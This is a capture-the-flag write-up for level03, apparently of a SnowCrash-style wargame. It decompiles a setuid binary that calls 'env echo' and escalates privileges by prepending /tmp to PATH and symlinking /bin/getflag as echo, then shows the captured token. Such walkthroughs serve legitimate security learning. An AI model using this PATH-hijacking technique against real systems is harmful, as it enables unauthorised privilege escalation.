# level03

The first thing we see is that we have an executable.

```
ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

We get a cheeky message when we run the executable.
```
Exploit me
```
We start with using `gdb` to gather more information on the executable.
Running it under `gdb` gives us nothing.
Disassembling the main gives us some information :
- A few fonctions are called in the main:
- `getegid()` (returns the effective group ID of the calling process)
- `geteuid()` (returns the effective user ID of the calling process)
- `setresgid(gid_t rgid, gid_t egid, gid_t sgid)` (sets the real group ID, the effective group ID, and the saved set-group-ID of the calling process)
- `setresuid(uid_t ruid, uid_t euid, uid_t suid)` (sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process)
- `system(const char *command)` (executes a command by calling `/bin/sh -c command`)

We copy the file on our host machine to manipulate it better using `scp`.
```
scp -P 4242 level03@192.168.56.101:/home/user/level03/level03 level03_exec
```
Once the file is copied, we pass it to dogbolt to decompile it and see what it does.
```c
// ------------------------ Functions -------------------------

// From module:   /home/user/level03/level03.c
// Address range: 0x80484a4 - 0x8048505
// Line range:    7 - 18
int main() {
    int32_t v1 = getegid(); // 0x80484ad
    int32_t v2 = geteuid(); // 0x80484b6
    setresgid(v1, v1, v1);
    setresuid(v2, v2, v2);
    return system("/usr/bin/env echo Exploit me");
}
```
A few things are happening in the main :
- The effective GID and UID are stored in variables `v1` and `v2`.
- Those variables are used to set the real, effective and saved ID of both the user and group.

Read more about ID [here](https://medium.com/@emanuele.santini.88/a-deep-introduction-to-root-access-on-linux-part-1-the-suid-and-sgid-permissions-0f1203dd126c) and [there](https://medium.com/@emanuele.santini.88/a-deep-introduction-to-root-access-on-linux-part-2-the-saved-user-and-group-id-49d1858e7bba).

From this we understand that we need to run the command getflag when running the executable, as we'll have the same ID as `flag03` when we'll do it.

We first find the path to the `getflag` command :
```
whereis getflag
getflag: /bin/getflag
```
We then find a way to create a symbolic link between `getflag` and `echo`. We'll use the `PATH` to do so.
```
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

Attempting to create a symbolic link between `getflag` and `echo` using the directories in `PATH` fails, we need a new directory to add in `PATH`.
We're going to use `tmp`. 

We need to add `tmp` to the `PATH` and create a symbolic link between `getflag` and `echo`.
```
export PATH=/tmp:$PATH
ln -s /bin/getflag /tmp/echo
```

Once it's done, we can execute `./level03` again and collect the flag.
```
./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```